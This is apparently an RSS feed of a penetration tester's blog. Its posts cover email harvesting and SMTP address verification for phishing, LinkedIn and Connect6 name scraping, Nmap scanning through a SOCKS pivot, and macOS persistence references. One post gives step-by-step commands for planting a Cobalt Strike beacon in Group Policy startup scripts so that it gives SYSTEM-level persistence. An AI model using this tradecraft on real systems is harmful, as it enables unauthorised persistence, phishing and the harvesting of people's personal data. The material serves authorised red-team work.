&lt;p&gt;&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;LoginHooks- &lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Launchd-&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf&#34;&gt;https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Dylib Hijacks-&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&#34;&gt;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Email Verification and Email Name Creation</title>
      <link>http://dev.cybersyndicates.com/2016/02/email-harvesting-and-name-creation/</link>
      <pubDate>Sun, 14 Feb 2016 14:23:45 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2016/02/email-harvesting-and-name-creation/</guid>
      <description>

&lt;p&gt;Over the past few months we have been rapidly expanding the capability of SimplyEmail. While it is a very simple tool, it has been extremely successful on a few live engagements I have been on. I feel like it is ready for recommendation to say the least. I did however notice a few key features that some of the guys on the team mentioned that would be nice to have integrated. Thanks to &lt;a href=&#34;https://twitter.com/_wald0&#34;&gt;@_wald0&lt;/a&gt; and his suggestions I have implemented a email verification option. Also I learned a trick or so a few months back from &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt; on sick site called &amp;ldquo;Connect6&amp;rdquo;, which seems to populate a large name DB of employees for each company. Also a fellow tester and friend (&lt;a href=&#34;https://twitter.com/nagasecurity&#34;&gt;Joshua Crumbaugh&lt;/a&gt;) let me on to a sick tool for grabbing Linkedin names from bing called &lt;a href=&#34;https://github.com/pan0pt1c0n/PhishBait&#34;&gt;PhishBait&lt;/a&gt;. With all this I set out to build some new capabilities for SimplyEmail and learn some new tricks :)&lt;/p&gt;

&lt;h4 id=&#34;smtp-email-verification&#34;&gt;SMTP Email Verification&lt;/h4&gt;

&lt;p&gt;This process is actually relatively easy to accomplish. Its a simple heuristic of SMTP return codes when attempting to send a email on the target SMTP server. The process takes place by first Identifying the proper MX record to point to. In many cases larger corporations will have more than one SMTP server with multiple MX records. These are for redundancy of course and are ordered by priority, here is a small snip of the code I built fast:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    def GetMX(self):
      MXRecord = [] 
      try:
        if self.verbose:
          print helpers.color(&#39; [*] Attempting to resolve MX records!&#39;, firewall=True)
        answers = dns.resolver.query(self.domain, &#39;MX&#39;)
        for rdata in answers:
          data = {
            &amp;quot;Host&amp;quot;: str(rdata.exchange),
            &amp;quot;Pref&amp;quot;: int(rdata.preference),
          }
          MXRecord.append(data)
        # Now find the lowest value in the pref
        Newlist = sorted(MXRecord, key=lambda k: k[&#39;Pref&#39;]) 
        # Set the MX record
        self.mxhost = Newlist[0]
        if self.verbose:
          val = &#39; [*] MX Host: &#39; + str(self.mxhost[&#39;Host&#39;])
          print helpers.color(val, firewall=True)
      except Exception as e:
        error = &#39; [!] Failed to get MX record: &#39; + str(e)
        print helpers.color(error, warning=True)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After obtaining all the MX records we can easily sort, pick the lowest value and feed it to the next function needed. So here is the meat of the verification checks. Before we go ahead and send the SMTP server all of the gathered emails we need to check if this SMTP server supports this. We do this via providing the STMP server a known &amp;ldquo;invalid&amp;rdquo; address, and we test for the a return code other than 250 (250 is a valid email code). If we get anything except a 250, we know that the SMTP server isn&amp;rsquo;t just returning a 250 for each address supplied. we can test this pretty simply:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; def VerifySMTPServer(self):
      &#39;&#39;&#39;
      Checks for code other than 250 for crap email.
      &#39;&#39;&#39;
      # Idea from:
      # https://www.scottbrady91.com/Email-Verification/Python-Email-Verification-Script
      hostname = socket.gethostname()
      socket.setdefaulttimeout(10)
      server = smtplib.SMTP(timeout=10)
      server.set_debuglevel(0)
      addressToVerify = &amp;quot;There.Is.Knowwaythiswillwork1234567@&amp;quot; + str(self.domain)
      try:
        server.connect(self.mxhost[&#39;Host&#39;])
        server.helo(hostname)
        server.mail(&#39;email@gmail.com&#39;)
        code, message = server.rcpt(str(addressToVerify))
        server.quit()
        if code == 250:
          return False
        else: 
          return True
      except Exception as e:
        print e
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So lets say our SMTP server supports this type of check, we can simply build a function to perform the check for our gathered emails. Here is a small small output of it in action:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-02-14-at-11.10.11-AM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-02-14-at-11.10.11-AM.png&#34; alt=&#34;Screen Shot 2016-02-14 at 11.10.11 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Obviously I needed to wrap this in a simple helper class for SimplyEmail, the full code (Class) can be found here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/VerifyEmails.py&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/VerifyEmails.py&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;connect6-name-creation&#34;&gt;Connect6 Name Creation&lt;/h4&gt;

&lt;p&gt;Im always extreamly nervous to add in functionality to SimpleEmail.. hence the name! In some cases name creation can be a pivotal and vital addition to your phishing campaigns. Some times SimplyEmail will only find the standard email addresses or just a few emails. In this case email creation may be your saving grace. On my assessments I with out doubt found Connect6.com is a reliable source to gather names associated with companies.&lt;/p&gt;

&lt;p&gt;Too start I throughly attempted to find  way to get the Connect6 URL using their search engine, with no anvil. This may be do to how they want you to pay for their service / API. So I did build a simple Google Dork function to attempt to resolve the correct URL:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    def Connect6AutoUrl(self):
      # Using startpage to attempt to get the URL
      # https://www.google.com/search?q=site:connect6.com+domain.com
      try:
        # This returns a JSON object
        urllist = []
        url = &amp;quot;https://www.google.com/search?q=site:connect6.com+%22&amp;quot; + self.domain + &#39;%22&#39;
        r = requests.get(url, headers=self.UserAgent)
      except Exception as e:
        error = &amp;quot;[!] Major issue with Google Search: for Connect6 URL&amp;quot; + str(e)
        print helpers.color(error, warning=True)
      try:
        RawHtml = r.content
        soup = BeautifulSoup(RawHtml)
        for a in soup.findAll(&#39;a&#39;, href=True):
          try:
            l = urlparse.parse_qs(urlparse.urlparse(a[&#39;href&#39;]).query)[&#39;q&#39;]
            if &#39;site:connect6.com&#39; not in l[0]:
              l = l[0].split(&amp;quot;:&amp;quot;)
              urllist.append(l[2])
          except:
            pass
        return urllist
      except Exception as e:
        print e
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Full code can be found here: &lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/Connect6.py&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/Connect6.py&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here is a quick sample of the output that you will given if it cant detect the correct URL:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-02-14-at-11.20.14-AM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-02-14-at-11.20.14-AM.png&#34; alt=&#34;Screen Shot 2016-02-14 at 11.20.14 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;linkedin-name-creation&#34;&gt;LinkedIn Name Creation&lt;/h4&gt;

&lt;p&gt;Linkedin is and has been know as a great source for social engineering, and recently I first hand got to see how effective it is to build a email campaign of it. Using the PhishBait tool mention earlier I was able to add in additional functionality and build in LinkedIn name scraping into SimplyEmail. Here is the really simple code I adapted:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def LinkedInNames(self):
      &#39;&#39;&#39;
      This function simply uses
      Bing to scrape for names and
      returns a list of list names.
      &#39;&#39;&#39;
      try:
        br = mechanize.Browser()
        br.set_handle_robots(False)
        self.domain = self.domain.split(&#39;.&#39;)
        self.domain = self.domain[0]
        r = br.open(&#39;http://www.bing.com/search?q=(site%3A%22www.linkedin.com%2Fin%2F%22%20OR%20site%3A%22www.linkedin.com%2Fpub%2F%22)%20%26%26%20(NOT%20site%3A%22www.linkedin.com%2Fpub%2Fdir%2F%22)%20%26%26%20%22&#39;+self.domain+&#39;%22&amp;amp;qs=n&amp;amp;form=QBRE&amp;amp;pq=(site%3A%22www.linkedin.com%2Fin%2F%22%20or%20site%3A%22www.linkedin.com%2Fpub%2F%22)%20%26%26%20(not%20site%3A%22www.linkedin.com%2Fpub%2Fdir%2F%22)%20%26%26%20%22&#39;+self.domain+&#39;%22&#39;)
        soup = BeautifulSoup(r)
        if soup:
          link_list = []
          NameList = []
          more_records = True
          Round = False
          while more_records:
            if Round:
              response = br.follow_link(text=&amp;quot;Next&amp;quot;)
              soup = BeautifulSoup(response)
            # enter this loop to parse all results
            # also follow any seondary links
            for definition in soup.findAll(&#39;h2&#39;):
              definition = definition.renderContents()
              if &amp;quot;LinkedIn&amp;quot; in definition:
                name = (((((definition.replace(&#39;&amp;lt;strong&amp;gt;&#39;,&#39;&#39;)).replace(&#39;&amp;lt;/strong&amp;gt;&#39;,&#39;&#39;)).split(&#39;&amp;gt;&#39;)[1]).split(&#39;|&#39;)[0]).rstrip()).split(&#39;,&#39;)[0]
                name = name.split(&#39; &#39;)
                if self.verbose:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally the full code can found here: &lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/LinkedinNames.py&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/LinkedinNames.py&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>SYSTEM Context Persistence in GPO Startup Scripts</title>
      <link>http://dev.cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/</link>
      <pubDate>Mon, 25 Jan 2016 04:32:51 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/</guid>
      <description>&lt;p&gt;Interesting enough I was recently experimenting on GPO settings to configure my Applocker for testing and came by Scripts under the (Computer Configuration) settings for GPO. This defiantly caught my attention, since persistence is a cat and mouse game of stored locations / methods. &lt;strong&gt;This has been mentioned but I haven&amp;rsquo;t seen it talked about so hey why not share what I did&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.36.07-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.36.07-PM.png&#34; alt=&#34;Screen Shot 2016-01-24 at 10.36.07 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I knew I wanted to weaponize it from a pure command line standpoint as the configuration utility is pretty much point and click. Some of the assumptions are:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;You have already elevated or have Local Admin context on the box&lt;/li&gt;
&lt;li&gt;Have the ability to upload a file in your agent (CobaltStike) / Have a Deployable .BAT/PS script&lt;/li&gt;
&lt;li&gt;Willing to drop something to disk for persistence&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.41.18-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.41.18-PM.png&#34; alt=&#34;Screen Shot 2016-01-24 at 10.41.18 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;While that GUI looks quite simple and easy to use, that would be to dang easy! Lets get started:&lt;/p&gt;

&lt;p&gt;The current process I use to deploy a CS Fully Staged Beacon:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Enumerate current GPO scripts&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Remove the psscripts.ini&lt;/li&gt;
&lt;li&gt;Upload a new psscripts.ini&lt;/li&gt;
&lt;li&gt;Upload the Beacon.ps1 scripts&lt;/li&gt;
&lt;li&gt;conduct a Gpupdate&lt;/li&gt;
&lt;li&gt;On restart you should get a beacon!&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The location of interest (while this seems trivial, do to the permissions on this directory you will have to force all commands):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Enumerate the Dir (See if a scripts.ini is built):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;beacon&amp;gt; powershell Get-ChildItem -Force C:\Windows\System32\GroupPolicy\Machine\Scripts\
[*] Tasked beacon to run: Get-ChildItem -Force C:\Windows\System32\GroupPolicy\Machine\Scripts\
[+] host called home, sent: 77 bytes
[+] received output:
 Directory: C:\Windows\System32\GroupPolicy\Machine\Scripts
Mode LastWriteTime Length Name 
---- ------------- ------ ---- 
d---- 10/15/2015 6:36 PM Shutdown 
d---- 1/24/2016 5:57 PM Startup 
-a-h- 1/24/2016 5:28 PM 184 psscripts.ini
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Enumerate to see the current scripts in-play:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell type C:\Windows\System32\GroupPolicy\Machine\Scripts\psscripts.ini
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you will noticed the structure goes (the 0Cmd.. is incremental):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[ScriptsConfig]
StartExecutePSFirst=true
[Startup]
0CmdLine=beacon2.ps1
0Parameters=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Simply copy this data and save it locally in a text editor and add in you PS agent name. Once you have completed this go ahead and upload to the target. A side note on this, something extremely weird happens when trying to use the built in shell / ls / cd within CS beacons. While this was a pain, I just resorted to using PS for most of it.&lt;/p&gt;

&lt;p&gt;Go ahead and delete the original psscripts.ini:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell Remove-Item -Force C:\Windo0ws\System32\GroupPolicy\Machine\Scripts\psscripts.ini
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After uploading the script to the C:\ drive (In my case I no ability to upload directly to the location):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell Move-Item -force -path C:\psscripts.ini -destination C:\Windows\System32\GroupPolicy\Machine\Scripts\
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally using CS Beacons Stageless PowerShel script I moved that to the required location:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell Move-Item -force -path C:\beacon2.ps1 -destination C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup

gpupdatep /force
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally on reboot you should have a callback! :)&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-11.25.47-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-11.25.47-PM.png&#34; alt=&#34;Screen Shot 2016-01-24 at 11.25.47 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To wrap up this seems like a great SYSTEM level call back and the cool part is you can add in parameters for custom payloads. Ex. if you wanted to only start at certain time you could pass the time or date that would like to restrict or even extend. This method seems extremely strong and has proved to be reliable method. Soon to come is the CS aggressor script and PS script to automate this.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Scanning Effectively Through a SOCKS Pivot with Nmap and Proxychains</title>
      <link>http://dev.cybersyndicates.com/2015/12/nmap-and-proxychains-scanning-through-a-socks-piviot/</link>
      <pubDate>Sun, 13 Dec 2015 19:14:20 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2015/12/nmap-and-proxychains-scanning-through-a-socks-piviot/</guid>
      <description>

&lt;p&gt;When ever I am on a pen-test and I come across a major problem (Every OP) that requires some creative solution and I love to share it. Not only that I could help someone else one day, but it really helps me retain the knowledge for future use.&lt;/p&gt;

&lt;p&gt;This past engagement we where on a very unique network dealing with ICS devices and a ton of Unix backend servers, while still handling our normal pen test methodology on the side (No Time to play). While I feel comfortable operating in most network environments, *NIX based environments generally pose to elevate the difficulty of lateral movement and achieving final end state goals of the OP. In this environment most of the critical assets we where targeting where properly VLAN’ed off and proper network segmentation was in place.&lt;/p&gt;

&lt;p&gt;After initial host discovery, we noticed our active host count was low and we figured we needed to gain a foothold on a dual homed box. Gaining a foothold didn’t take long on a lovely Unix jump box. After confirming we could hit multiple VLANs and a known target, it was time to re-scan for our initial host discovery.&lt;/p&gt;

&lt;p&gt;In the past I have played around with getting Nmap to scan through Tor, and there are plenty of those tutorials on the web. But this time I had to perform a larger scan of multiple IP’s (/16) for an initial host discovery. I knew I could use the Unix jump box as a SOCKS4/5 proxy to funnel all my scan data through using SSH without dropping anything to disk.&lt;/p&gt;

&lt;p&gt;Here is the idea:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-5.42.29-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-5.42.29-PM.png&#34; alt=&#34;Screen Shot 2015-12-11 at 5.42.29 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The first step is to setup your SSH SOCKS Proxy:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ssh -DnF 8080 user@jump-box
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After that was setup I had to configure ProxyChains:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.47.24-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.47.24-PM.png&#34; alt=&#34;Screen Shot 2015-12-11 at 6.47.24 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Turn on Quite mode for ProxyChains&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.48.36-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.48.36-PM.png&#34; alt=&#34;Screen Shot 2015-12-11 at 6.48.36 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As we move forward we will discover the timeouts section will have to be tinkered with. This is key to optimizing your performance with Nmap.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.55.59-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.55.59-PM.png&#34; alt=&#34;Screen Shot 2015-12-11 at 6.55.59 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lastly set up the strike chain.&lt;/p&gt;

&lt;h3 id=&#34;heart-aches-with-nmap&#34;&gt;Heart Aches with Nmap&lt;/h3&gt;

&lt;p&gt;So now we are at the main point of even writing this blog. Before when test scanning through Proxy tunnels I only did one or two address at a time. But in this case I needed to scan a large amount of IP space in a reasonable time table. In the past few months I have greatly optimized my scanning techniques to get the most out of my discovery scans. Working with a team of 3-5 can be tough with coordination and when conducting a internal pen-test I may need to get through generally entire /8 or a few /16’s. In this case I had a potential /16 behind my jump box.&lt;/p&gt;

&lt;p&gt;So after following my SOP’s I noticed just firing off Nmap into this SOCKS proxy tunnel wasn’t going to cut it. We experienced large drops in performance and Nmap’s performance and timing parameters weren’t working correctly. Here is my standard Nmap String (Internal scan):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Nmap -Pn -n -sS –p 21-23,25,53,111,137,139,445,80,443,3389,5900,8080,8443 --min-hostgroup 255 --min-rtt-timeout 1ms --max-rtt-timeout 70ms --max-retries 0 --max-scan-delay 0 --min-rate 2000 -oA &amp;lt;customer-#&amp;gt; -vvv --open -iL &amp;lt;IPLIST&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But after 2 minutes of scanning with this I noticed a few things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Parallel scans weren’t taking place&lt;/li&gt;
&lt;li&gt;Timing and performance aspects don’t work&lt;/li&gt;
&lt;li&gt;Nmap cant perform &amp;ndash;defeat-rst-ratelimit with full TCP Connect scans –sT&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;It would wait the full 1500ms for a port to time-out (Rmbr the Proxy config)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A ton of these problems stem from the fact that we are using a SOCKS proxy, and the nature of the connect scan. When you scan from your Kali system you perform the following Nmap -&amp;gt; Proxy-chains -&amp;gt; SOCKS (Jump Box) -&amp;gt; Target System. I discovered that even though you have all the timing settings setup Nmap is going to interpret that the Half Open connection with the SOCKS proxy as open and will let it hang till ProxyChains literally kills the connection due to a (TCP-Read-Timeout). At first I thought I could solve this issue using the &amp;ldquo;&amp;ndash;host-timeout 80ms&amp;rdquo; flag. But I discovered once that host-timeout was reached it will completely kill the connection (NMAP ADD IN A PORT TIMEOUT!).&lt;/p&gt;

&lt;p&gt;Instantly I knew I had to build out a quick script to help reduce the time it would take get through this scan. So I quickly hacked together a multi processed Python script to launch separate Proxychain / Nmap instances. This script sped up the time dramatically, and incase one process was hung the others could continue on rather than coming to a dead stop. I’m sure this could be done way better, but I thought I could atleast post what I did on the fly to speed up my scans. Also my Jump box couldn&amp;rsquo;t handle (Popen and shell=True) for the sub process call, It was going a bit too fast. Right now I used call_check and just escaped that returned data for the moment. In the coming weeks I do plan to clean up the code a bit. All in all it took some time to trouble shoot the problem and thought I would share.&lt;/p&gt;

&lt;p&gt;The script can be found here: &lt;a href=&#34;https://github.com/killswitch-GUI/PenTesting-Scripts/blob/master/Proxychains-Nmap.py&#34;&gt;https://github.com/killswitch-GUI/PenTesting-Scripts/blob/master/Proxychains-Nmap.py&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    import multiprocessing
    import argparse
    import Queue
    import threading
    import os
    import sys
    import subprocess
    from random import randint




    
    def cli_parser():
     parser = argparse.ArgumentParser(add_help=False, description=&#39;&#39;&#39;This script Simply routes your nmap scan in a &amp;quot;sort-of&amp;quot; fast way 
     through a ProcyChain that has been setup.
     \n\t(1) You will find out that when routing nmap through a Proxychain connection that Timing performace is out the window.
     \n\t(2) This is do to the nature of a SOCKS proxy and SYN-&amp;gt;SYN/ACK connection is already established in NMAPS Eyes.
     \n\t(3) It out puts random (#) of .gnmap file for each IP for parsing. (MAKE A FOLDER) :)
     &#39;&#39;&#39;)
     parser.add_argument(&amp;quot;-i&amp;quot;, metavar=&amp;quot;iplist.txt&amp;quot;, help=&amp;quot;Set Ip List of IPs Delimited by line&amp;quot;)
     parser.add_argument(&#39;-h&#39;, &#39;-?&#39;, &#39;--h&#39;, &#39;-help&#39;, &#39;--help&#39;, action=&amp;quot;store_true&amp;quot;, help=argparse.SUPPRESS)
     args = parser.parse_args()
     if args.h: 
     parser.print_help()
     sys.exit()
     if not args.i:
     print &amp;quot;[!] I need a list IP&#39;s!&amp;quot;
     sys.exit()
     return args.i




    
    def Execution(Task_queue):
     while True:
     Ip = Task_queue.get()
     # If the queue is emepty exit this proc
     # Setup a simple output in the folder, For gnmap Parser
     IpName = str(Ip).replace(&#39;.&#39;,&amp;quot;-&amp;quot;) + str(&amp;quot;.gnmap&amp;quot;)
     if Ip is None:
     break
     try:
     print &amp;quot;[*] On Ip: &amp;quot; + Ip
     test = subprocess.check_output([&amp;quot;proxychains&amp;quot;, &amp;quot;nmap&amp;quot;, &amp;quot;-Pn&amp;quot;, &amp;quot;-n&amp;quot;, &amp;quot;-sT&amp;quot;, &amp;quot;--max-scan-delay&amp;quot;, &amp;quot;0&amp;quot;, &amp;quot;-p111,445,139,21-23,80,443&amp;quot;, &amp;quot;-oG&amp;quot;, IpName, &amp;quot;--open&amp;quot;, Ip])
     test = &amp;quot;&amp;quot;
     except:
     pass




    
    def TaskSelector(Task_queue, verbose=False):
     total_proc = int(8)
     for i in xrange(total_proc):
     Task_queue.put(None)
     procs = []
     for thread in range(total_proc):
     procs.append(multiprocessing.Process(target=Execution, args=(Task_queue,)))
     for p in procs:
     p.daemon = True
     p.start()
     for p in procs:
     p.join()
     Task_queue.close()




    
    def Ip_List(Task_queue, cli_IpList):
     items = []
     cli_IpList = str(cli_IpList)
     try:
     with open(cli_IpList, &amp;quot;r&amp;quot;) as myfile:
     lines = myfile.readlines()
     for line in lines:
     line = line.rstrip(&#39;\n&#39;)
     items.append(line)
     for item in items:
     Task_queue.put(item)
     return Task_queue
     except Exception as e:
     print &amp;quot;[!] Please check your Ip List: &amp;quot; + str(e)
     sys.exit(0)




    
    def main():
     cli_IpList = cli_parser()
     Task_queue = multiprocessing.Queue()
     Task_queue = Ip_List(Task_queue, cli_IpList)
     TaskSelector(Task_queue)




    
    if __name__ == &amp;quot;__main__&amp;quot;:
     try: 
     main()
     except KeyboardInterrupt:
     print &#39;Interrupted&#39;
     try:
     sys.exit(0)
     except SystemExit:
     os._exit(0)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>SimplyEmail v0.5: PDFMiner!</title>
      <link>http://dev.cybersyndicates.com/2015/11/simplyemail-v0-5-pdfminer/</link>
      <pubDate>Sat, 21 Nov 2015 18:32:48 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2015/11/simplyemail-v0-5-pdfminer/</guid>
      <description>

&lt;h2 id=&#34;major-addition-to-simplyemail-core&#34;&gt;Major addition to SimplyEmail Core&lt;/h2&gt;

&lt;p&gt;When I first started this project I published a pretty in-depth “path” of progression. I told my self I would be following this to help build a tool that would actually enhance and build off what is already open source. I knew I had to have unique methods and content. One thing that I use quite often is google dorking for multiple Intel gathering techniques for a OP, so I knew this had to be added!&lt;/p&gt;

&lt;p&gt;&lt;blockquote class=&#34;twitter-tweet&#34; data-lang=&#34;en&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;SimplyEmail v0.5: PDFMiner just added! Email recon with PDF scraping. &lt;a href=&#34;https://t.co/awX3eoRGNK&#34;&gt;https://t.co/awX3eoRGNK&lt;/a&gt; (or on GitHub) &lt;a href=&#34;https://t.co/JVsc7yrflE&#34;&gt;https://t.co/JVsc7yrflE&lt;/a&gt;&lt;/p&gt;&amp;mdash; Alex Rymdeko-harvey (@Killswitch_GUI) &lt;a href=&#34;https://twitter.com/Killswitch_GUI/status/668137062055452673&#34;&gt;November 21, 2015&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;h3 id=&#34;intel-gathering-stage&#34;&gt;Intel Gathering Stage&lt;/h3&gt;

&lt;p&gt;During my tests I weigh heavy on open source information  to help me paint a picture of the culture and potential target rich opportunities once internal. During this stage we are often tasked to Phish external for statistics or payloads to simulate and external threat.&lt;/p&gt;

&lt;p&gt;This generally encompasses the ability to generate a custom phishing template that is somewhat unique to the target. I can sometimes locate sensitive information using the &lt;strong&gt;(site:target.com file:pdf) &lt;/strong&gt;method to gather documents they may have published. We generally gather the following information:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;CEO and main leadership&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Current issues or press releases that are related to the target&lt;/li&gt;
&lt;li&gt;What the company sells&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I take all the above into account when developing potential targeted emails. Funny enough these documents are a great source for emails as well. As they generally have contact information outside the standard &lt;a href=&#34;mailto:info@company.com&#34;&gt;info@company.com&lt;/a&gt;. This source however can be hard to gather from the HTML scrapping modules already in place. One the documents can take a good amount of time to gather, and for the sake of speed I have always found using googles indexed files always seemed to speed things up.&lt;/p&gt;

